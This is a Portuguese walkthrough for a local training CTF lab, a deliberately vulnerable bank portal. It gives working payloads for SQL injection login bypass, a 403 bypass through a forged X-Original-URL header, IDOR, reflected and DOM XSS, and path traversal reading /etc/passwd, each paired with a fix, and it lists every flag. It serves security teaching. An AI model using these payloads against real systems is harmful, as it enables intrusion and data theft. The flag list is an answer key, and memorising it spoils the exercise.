# Walkthrough - lab-01-minibank

Este walkthrough ensina o fluxo esperado para resolver o lab **lab-01-minibank**, baseado na aplicacao **MiniBank Internal Portal**.

O objetivo didatico e fazer o aluno descobrir rotas sensiveis por enumeracao logica, seguindo pistas visiveis na aplicacao, no codigo-fonte HTML, no `robots.txt`, no dashboard e em respostas HTTP.

As sete vulnerabilidades principais sao:

- Credencial vazada em arquivo publico
- SQL Injection no login
- IDOR em contas
- Path Traversal / LFI controlado
- Bypass de 403 por header legado
- XSS basico refletido
- DOM XSS intermediario

O lab tambem ensina enumeracao de usuarios por mensagens diferentes no login. Essa falha nao possui flag propria.

## 1. Preparacao do ambiente

Entre na pasta do lab:

```bash
cd ~/ctf-labs/lab-01-minibank
```

Suba os containers:

```bash
sudo docker compose up --build
```

O esperado e iniciar:

- aplicacao web em `http://localhost:8088`
- MySQL apenas na rede interna do Docker Compose
- somente a porta `8088` exposta no host

Valide a home:

```bash
curl -i http://localhost:8088
```

Voce deve receber HTTP `200 OK` e HTML com **MiniBank Internal Portal**.

## 2. Enumeracao inicial

Antes de explorar, observe. A primeira habilidade a treinar e encontrar pistas sem chute.

```bash
curl -i http://localhost:8088
curl -s http://localhost:8088 | head
curl -s http://localhost:8088 | grep -i "admin\|robots\|backup\|dev\|status"
```

Teste uma rota inexistente para entender o padrao de erro:

```bash
curl -i http://localhost:8088/nao-existe
```

## 3. Comentario HTML

Visualize o codigo-fonte e procure comentarios:

```bash
curl -s http://localhost:8088 | grep -i "<!--"
```

Comentario esperado:

```html
<!-- revisar robots.txt antes de publicar o portal legado -->
```

Raciocinio: comentario HTML nao e controle de acesso, mas pode revelar processo interno, pendencias de publicacao e onde procurar proximas pistas.

Correcao: remover comentarios operacionais do HTML entregue ao cliente.

## 4. robots.txt

O comentario sugere verificar `robots.txt`.

```bash
curl -i http://localhost:8088/robots.txt
```

O arquivo lista rotas que nao deveriam ser indexadas. Isso nao protege nada, mas orienta a enumeracao.

Rotas relevantes:

- `/admin`
- `/admin/reports`
- `/backup`
- `/dev.txt`
- `/download`
- `/status`

## 5. Status verboso

Acesse a rota descoberta:

```bash
curl -i http://localhost:8088/status
```

O retorno revela informacoes como:

```json
{
  "status": "ok",
  "app": "MiniBank Internal Portal",
  "version": "1.4.2-dev",
  "env": "development",
  "internal_path": "/usr/src/app",
  "database": "mysql://minibank-db:3306/minibank",
  "proxy_compatibility": "legacy reverse proxy compatibility mode enabled"
}
```

Impacto: ajuda fingerprinting, confirma ambiente de desenvolvimento, mostra path interno e indica que existe compatibilidade legada no proxy.

Correcao: endpoints publicos de status devem retornar apenas informacao minima, como `{"status":"ok"}`. Diagnosticos detalhados devem ficar restritos.

## 6. Bypass de 403 por header legado

O `robots.txt` revelou uma area administrativa:

```bash
curl -i http://localhost:8088/admin/reports
```

O acesso direto deve retornar `403 Forbidden` e nao deve mostrar flag.

Agora use o Burp:

1. Abra a rota no navegador com o Burp Proxy ativo.
2. Envie a requisicao para o Repeater.
3. Adicione um header de reescrita legado.
4. Reenvie a requisicao.

Headers que liberam o conteudo no lab:

```http
X-Original-URL: /admin/reports
```

ou:

```http
X-Rewrite-URL: /admin/reports
```

Com `curl`:

```bash
curl -i http://localhost:8088/admin/reports \
  -H "X-Original-URL: /admin/reports"
```

Flag:

```text
FLAG{403_bypass_capturado}
```

Raciocinio: algumas aplicacoes ou middlewares legados confiam indevidamente em headers criados por proxies reversos. Se o backend usa esses headers para decidir qual rota foi solicitada, o cliente pode forjar o valor.

Impacto:

- bypass de pagina 403
- exposicao de relatorios administrativos
- quebra de controle de acesso por confianca em header controlado pelo cliente

Correcao:

- ignorar headers de reescrita vindos do cliente
- remover compatibilidade legada quando nao for necessaria
- validar autorizacao no backend com sessao/perfil, nao por header
- no proxy real, sobrescrever ou remover headers sensiveis antes de encaminhar

## 7. Credencial vazada em arquivo publico

O `robots.txt` revelou `/dev.txt`. Acesse:

```bash
curl -i http://localhost:8088/dev.txt
```

O arquivo contem a credencial:

```text
backup_user:backup123
```

E a flag:

```text
FLAG{credencial_exposta_capturada}
```

Valide o impacto usando a credencial em `/backup`:

```bash
curl -i http://localhost:8088/backup
curl -i -u backup_user:backup123 http://localhost:8088/backup
```

Sem credencial, o esperado e HTTP `401`. Com `backup_user:backup123`, o esperado e HTTP `200 OK`.

Correcao:

- remover arquivos sensiveis de `app/public`
- rotacionar credenciais expostas
- usar variaveis de ambiente ou secret manager
- revisar publicacao de artefatos estaticos

## 8. Enumeracao de usuarios e SQL Injection

A rota de login usa MySQL e vaza diferenca entre usuario inexistente e senha incorreta.

Valide usuario inexistente:

```bash
curl -i -X POST http://localhost:8088/login \
  -d "username=naoexiste" \
  -d "password=teste"
```

Mensagem esperada:

```text
Usuario nao encontrado.
```

Valide usuario existente com senha incorreta:

```bash
curl -i -X POST http://localhost:8088/login \
  -d "username=joao" \
  -d "password=errada"
```

Mensagem esperada:

```text
Senha invalida.
```

Isso permite enumerar usuarios validos. No lab, essa enumeracao e intencional e nao possui flag propria.

O ponto vulneravel principal e a concatenacao direta de `username` e `password` na query SQL.

Payload funcional:

```text
username: admin' OR '1'='1' -- -
password: qualquercoisa
```

Inclua um espaco apos `--`; no MySQL ele faz parte do comentario SQL. O `-` final acima existe apenas para deixar o espaco visivel no payload.

Ao enviar o formulario, a aplicacao deve redirecionar para `/dashboard` como usuario admin.

Flag:

```text
FLAG{sqli_capturada}
```

Correcao:

- prepared statements
- queries parametrizadas
- hash forte de senha
- respostas de erro uniformes

## 9. IDOR em contas

Faca login como usuario comum:

```text
joao / joao123
```

Acesse uma conta do Joao:

```text
http://localhost:8088/account/1
```

Troque apenas o ID para a conta de Maria:

```text
http://localhost:8088/account/2
```

A aplicacao exige autenticacao, mas nao valida se a conta pertence ao usuario logado.

Flag:

```text
FLAG{idor_capturada}
```

Correcao:

- validar dono do recurso no backend
- filtrar por `id` e `user_id`
- testar acesso cruzado entre usuarios

## 10. XSS basico refletido

Depois de entrar no dashboard, observe o link **Busca de clientes**. A rota tambem pode ser acessada diretamente:

```text
http://localhost:8088/search
```

Teste uma busca comum:

```text
http://localhost:8088/search?q=teste
```

O valor de `q` volta no HTML da resposta. Agora teste um payload simples de script:

```html
<script>alert(1)</script>
```

URL codificada para teste rapido:

```bash
curl -i "http://localhost:8088/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
```

No navegador, o JavaScript deve executar porque a aplicacao reflete a entrada sem sanitizacao.

Flag:

```text
FLAG{xss_basico_capturado}
```

Raciocinio: XSS refletido ocorre quando a entrada do usuario via request HTTP volta na resposta HTML sem escape seguro.

Impacto:

- execucao de JavaScript no navegador da vitima
- roubo de dados acessiveis ao DOM
- phishing ou alteracao visual da pagina

Correcao:

- escapar output HTML
- usar templates com escape automatico
- validar e normalizar entrada
- aplicar Content Security Policy como defesa adicional

## 11. DOM XSS intermediario

No dashboard, observe o link **Ferramentas do cliente**:

```text
http://localhost:8088/client-tools
```

Essa pagina contem JavaScript client-side que le `window.location.hash`, extrai o parametro `msg` e insere o valor no DOM usando `innerHTML`.

Teste uma mensagem simples:

```text
http://localhost:8088/client-tools#msg=teste
```

Agora teste um payload em atributo HTML:

```text
http://localhost:8088/client-tools#msg=<img src=x onerror=alert(1)>
```

No DOM XSS, o payload nao aparece em logs HTTP nem chega ao servidor, porque o fragmento `#...` e processado somente pelo navegador.

Flag:

```text
FLAG{dom_xss_capturado}
```

Raciocinio: DOM XSS acontece quando JavaScript da pagina pega uma fonte controlada pelo usuario, como `location.hash`, e escreve em um sink perigoso, como `innerHTML`.

Correcao:

- usar `textContent` em vez de `innerHTML`
- sanitizar HTML quando HTML for realmente necessario
- evitar usar fragmentos de URL como HTML
- revisar sinks perigosos no frontend

## 12. Path Traversal / LFI controlado

O `robots.txt` revelou `/download`. Teste primeiro um arquivo esperado:

```bash
curl -i "http://localhost:8088/download?file=public-info.txt"
```

Leia tambem o relatorio de Q2:

```bash
curl -i "http://localhost:8088/download?file=report-q2.txt"
```

Pista relevante:

```text
Durante a migracao, a configuracao antiga foi movida para o diretorio config.
Arquivo revisado pela equipe: legacy.conf
```

Prove a leitura fora do diretorio permitido lendo um arquivo conhecido do sistema:

```bash
curl -i "http://localhost:8088/download?file=../../../../etc/passwd"
```

Volte ao vazamento de `/status` e observe:

```json
"internal_path": "/usr/src/app"
```

Como o downloader parte de `/usr/src/app/files`, a pista `config` + `legacy.conf` aponta para um arquivo legado acessivel voltando um diretorio:

```bash
curl -i "http://localhost:8088/download?file=../config/legacy.conf"
```

Flag:

```text
FLAG{path_traversal_capturada}
```

Correcao:

- usar allowlist de arquivos
- normalizar caminho
- bloquear `../`
- garantir que o caminho final permanece dentro do diretorio permitido

## 13. Fluxo esperado do aluno

1. Acessar a home
2. Visualizar o codigo-fonte
3. Encontrar comentario HTML sugerindo `robots.txt`
4. Acessar `/robots.txt`
5. Descobrir `/status`, `/dev.txt`, `/backup`, `/download`, `/admin` e `/admin/reports`
6. Usar `/status` para entender o ambiente e a pista de proxy legado
7. Testar `/admin/reports`, receber 403 e validar bypass no Burp Repeater com header legado
8. Acessar `/dev.txt` e encontrar credencial exposta
9. Usar credencial no `/backup`
10. Enumerar usuarios por mensagens diferentes no login
11. Explorar login com SQL Injection
12. Acessar contas e explorar IDOR
13. Usar links do dashboard para testar XSS refletido e DOM XSS
14. Ler `report-q2.txt` e identificar a pista `config` + `legacy.conf`
15. Provar Path Traversal com `/etc/passwd`
16. Usar `internal_path=/usr/src/app` para ler `../config/legacy.conf`

## 14. Validacao rapida

Com a aplicacao em execucao:

```bash
curl -i http://localhost:8088
curl -i http://localhost:8088/status
curl -i http://localhost:8088/robots.txt
curl -i http://localhost:8088/admin/reports
curl -i http://localhost:8088/admin/reports -H "X-Original-URL: /admin/reports"
curl -i http://localhost:8088/dev.txt
curl -i -X POST http://127.0.0.1:8088/login -d "username=naoexiste" -d "password=teste"
curl -i -X POST http://127.0.0.1:8088/login -d "username=joao" -d "password=errada"
curl -i "http://127.0.0.1:8088/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
curl -i "http://localhost:8088/download?file=public-info.txt"
curl -i "http://localhost:8088/download?file=report-q2.txt"
curl -i "http://localhost:8088/download?file=../../../../etc/passwd"
curl -i "http://localhost:8088/download?file=../config/legacy.conf"
```

Valide o DOM XSS no navegador:

```text
http://127.0.0.1:8088/client-tools#msg=<img src=x onerror=alert(1)>
```

Resultado esperado:

```text
FLAG{403_bypass_capturado}
FLAG{credencial_exposta_capturada}
FLAG{sqli_capturada}
FLAG{idor_capturada}
FLAG{xss_basico_capturado}
FLAG{dom_xss_capturado}
FLAG{path_traversal_capturada}
```
